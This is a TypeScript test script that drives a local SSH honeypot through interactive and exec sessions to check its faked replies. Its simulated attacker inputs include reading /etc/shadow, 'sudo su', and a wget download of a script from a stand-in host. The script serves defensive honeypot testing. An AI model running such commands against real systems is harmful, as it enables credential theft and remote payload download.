/**
 * Verification: drive the honeypot the way a REAL ssh client does, in both
 * modes — interactive PTY shell and non-interactive `ssh host "cmd"`.
 * Usage: npx tsx scripts/verify-honeypot.ts
 */
import { Client } from "ssh2";

const HOST = "127.0.0.1";
const PORT = 2222;

/** Interactive: open a shell, type commands, read the faked replies. */
function interactive(user: string, pass: string, cmds: string[]) {
  return new Promise<void>((resolve, reject) => {
    const c = new Client();
    c.on("ready", () => c.shell({ term: "xterm" }, (err, stream) => {
      if (err) return reject(err);
      let out = "";
      stream.on("data", (d: Buffer) => { out += d.toString(); });
      stream.stderr.on("data", (d: Buffer) => { out += d.toString(); });
      let i = 0;
      const next = () => {
        if (i >= cmds.length) { setTimeout(() => { c.end(); resolve(); }, 300); return; }
        stream.write(cmds[i++] + "\n");
        setTimeout(next, 350);
      };
      setTimeout(next, 400);
    }));
    c.on("error", reject);
    c.connect({ host: HOST, port: PORT, username: user, password: pass, readyTimeout: 8000 });
  });
}

/** Non-interactive: exactly what `ssh -p 2222 root@host "id"` does. */
function execMode(user: string, pass: string, cmd: string) {
  return new Promise<string>((resolve, reject) => {
    const c = new Client();
    c.on("ready", () => c.exec(cmd, (err, stream) => {
      if (err) return reject(err);
      let out = "";
      stream.on("data", (d: Buffer) => { out += d.toString(); });
      stream.stderr.on("data", (d: Buffer) => { out += d.toString(); });
      stream.on("close", () => { c.end(); resolve(out); });
    }));
    c.on("error", reject);
    c.connect({ host: HOST, port: PORT, username: user, password: pass, readyTimeout: 8000 });
  });
}

const t0 = Date.now();
console.log("--- interactive PTY shell (root:hunter2) ---");
await interactive("root", "hunter2", ["whoami", "id", "cat /etc/shadow", "sudo su"]);

console.log("--- non-interactive exec (admin:letmein) ---");
const out = await execMode("admin", "letmein", "uname -a");
console.log(`  honeypot replied: ${JSON.stringify(out.trim())}`);

console.log("--- non-interactive exec with a download attempt ---");
const out2 = await execMode("admin", "letmein", "wget http://10.0.0.1/x.sh");
console.log(`  honeypot replied: ${JSON.stringify(out2.trim())}`);

console.log(`\ndone in ${Date.now() - t0}ms`);
process.exit(0);
